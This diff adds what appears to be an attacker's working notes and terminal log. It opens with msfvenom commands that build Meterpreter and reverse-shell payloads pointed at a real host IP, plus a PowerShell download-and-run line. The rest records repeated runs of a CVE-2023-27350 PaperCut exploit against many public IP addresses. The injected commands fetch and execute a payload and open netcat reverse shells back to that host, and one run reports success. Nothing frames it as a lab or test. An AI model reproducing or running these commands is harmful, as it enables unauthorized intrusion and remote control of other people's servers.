@@ -1,0 +1,417 @@
+	
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=45.88.90.68 lport=1313 -f exe >win.exe
+
+
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=45.88.90.68 LPORT=1313 -f elf > system.elf
+
+
+
+powershell -c iwr http://45.88.90.68:8000/win.exe -outfile win.exe
+
+cmd.exe /c win.exe
+
+
+18.144.11.98
+acelerati
+
+albinolobster
+
+
+
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# ls
+CVE-2023-27350  CVE-2023-27350.py  README.md
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# ls                     
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://185.190.241.64:9191 -c "curl 45.88.90.68:8000"  
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+^CTraceback (most recent call last):
+  File "/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350/CVE-2023-27350.py", line 95, in <module>
+    execute(args.url, sess, args.command)
+  File "/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350/CVE-2023-27350.py", line 78, in execute
+    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 637, in post
+    return self.request("POST", url, data=data, json=json, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 589, in request
+    resp = self.send(prep, **send_kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 703, in send
+    r = adapter.send(request, **kwargs)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 486, in send
+    resp = conn.urlopen(
+           ^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 716, in urlopen
+    httplib_response = self._make_request(
+                       ^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 468, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 463, in _make_request
+    httplib_response = conn.getresponse()
+                       ^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/http/client.py", line 1390, in getresponse
+    response.begin()
+  File "/usr/lib/python3.11/http/client.py", line 325, in begin
+    version, status, reason = self._read_status()
+                              ^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/http/client.py", line 286, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/socket.py", line 706, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+KeyboardInterrupt
+
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://185.190.241.64:9191 -c "curl 45.88.90.68:8000"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+^[[A
+
+
+
+^CTraceback (most recent call last):
+  File "/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350/CVE-2023-27350.py", line 95, in <module>
+    execute(args.url, sess, args.command)
+  File "/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350/CVE-2023-27350.py", line 78, in execute
+    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 637, in post
+    return self.request("POST", url, data=data, json=json, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 589, in request
+    resp = self.send(prep, **send_kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 703, in send
+    r = adapter.send(request, **kwargs)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 486, in send
+    resp = conn.urlopen(
+           ^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 716, in urlopen
+    httplib_response = self._make_request(
+                       ^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 468, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 463, in _make_request
+    httplib_response = conn.getresponse()
+                       ^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/http/client.py", line 1390, in getresponse
+    response.begin()
+  File "/usr/lib/python3.11/http/client.py", line 325, in begin
+    version, status, reason = self._read_status()
+                              ^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/http/client.py", line 286, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/socket.py", line 706, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+KeyboardInterrupt
+
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://185.190.241.64:9191 -c "curl 45.88.90.68:8000"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+^CTraceback (most recent call last):
+  File "/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350/CVE-2023-27350.py", line 95, in <module>
+    execute(args.url, sess, args.command)
+  File "/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350/CVE-2023-27350.py", line 78, in execute
+    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 637, in post
+    return self.request("POST", url, data=data, json=json, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 589, in request
+    resp = self.send(prep, **send_kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 703, in send
+    r = adapter.send(request, **kwargs)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 486, in send
+    resp = conn.urlopen(
+           ^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 716, in urlopen
+    httplib_response = self._make_request(
+                       ^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 468, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 463, in _make_request
+    httplib_response = conn.getresponse()
+                       ^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/http/client.py", line 1390, in getresponse
+    response.begin()
+  File "/usr/lib/python3.11/http/client.py", line 325, in begin
+    version, status, reason = self._read_status()
+                              ^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/http/client.py", line 286, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/socket.py", line 706, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+KeyboardInterrupt
+
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://2.136.83.35:9191 -c "curl 45.88.90.68:8000"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://2.136.83.35:9191 -c "curl 45.88.90.68:8000"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://2.136.83.35:9191 -c "wget http://45.88.90.68:8000/system.elf && ./system.elf"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://2.136.83.35:9191 -c "nc -c /bin/bash 45.88.90.68 1313"                       
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://2.136.83.35:9191 -c "nc -c /bin/bash 45.88.90.68 1313"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://2.136.83.35:9191 -c "nc -c /bin/bash 45.88.90.68 1313"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://2.136.83.35:9191 -c "nc -c /bin/bash 45.88.90.68 1313"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://2.136.83.35:9191 -c "nc -c /bin/bash 45.88.90.68 1313"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://2.136.83.35:9191 -c "nc -c /bin/bash 45.88.90.68 1313"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://2.136.83.35:9191 -c "nc -c /bin/bash 45.88.90.68 1313"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://2.136.83.35:9191 -c "nc -c /bin/bash 45.88.90.68 1313"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://154.127.32.11:9191 -c "curl 45.88.90.68:8000"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://154.127.32.11:9191 -c "curl 45.88.90.68:1313"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://177.69.105.129:9191 -c "curl 45.88.90.68:1313"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://88.149.199.202:9191 -c "curl 45.88.90.68:1313"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://88.149.199.202:9191 -c "cmd.exe /c curl 45.88.90.68:1313"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://177.69.105.129::9191 -c "cmd.exe /c curl 45.88.90.68:1313"
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/requests/models.py", line 434, in prepare_url
+    scheme, auth, host, port, path, query, fragment = parse_url(url)
+                                                      ^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/urllib3/util/url.py", line 397, in parse_url
+    return six.raise_from(LocationParseError(source_url), None)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "<string>", line 3, in raise_from
+urllib3.exceptions.LocationParseError: Failed to parse: http://177.69.105.129::9191/app?service=page/SetupCompleted
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350/CVE-2023-27350.py", line 91, in <module>
+    sess = get_session_id(args.url)
+           ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350/CVE-2023-27350.py", line 8, in get_session_id
+    r = s.get(f'{base_url}/app?service=page/SetupCompleted', verify=False)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 602, in get
+    return self.request("GET", url, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 575, in request
+    prep = self.prepare_request(req)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 486, in prepare_request
+    p.prepare(
+  File "/usr/lib/python3/dist-packages/requests/models.py", line 368, in prepare
+    self.prepare_url(url, params)
+  File "/usr/lib/python3/dist-packages/requests/models.py", line 436, in prepare_url
+    raise InvalidURL(*e.args)
+requests.exceptions.InvalidURL: Failed to parse: http://177.69.105.129::9191/app?service=page/SetupCompleted
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://177.69.105.129:9191 -c "cmd.exe /c curl 45.88.90.68:1313" 
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://5.61.217.51:9191 -c "cmd.exe /c curl 45.88.90.68:1313"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://5.172.70.107:9191 -c "cmd.exe /c curl 45.88.90.68:1313"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://5.172.70.107:9191 -c "cmd.exe /c curl 45.88.90.68:1313"
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[-] Might not have a printer configured. Exploit manually by adding one.
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
+                                                                                                                                                 
+┌──(root㉿aaravos)-[/home/aaravos/testing/CVE-2023-27350-POC/CVE-2023-27350]
+└─# python CVE-2023-27350.py -u http://34.217.98.105:3551 -c "curl 45.88.90.68:8000"                        
+[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
+[*] Updating print-and-device.script.enabled to Y
+[*] Updating print.script.sandboxed to N
+[*] Prepparing to execute...
+[+] Executed successfully!
+[*] Updating print-and-device.script.enabled to N
+[*] Updating print.script.sandboxed to Y
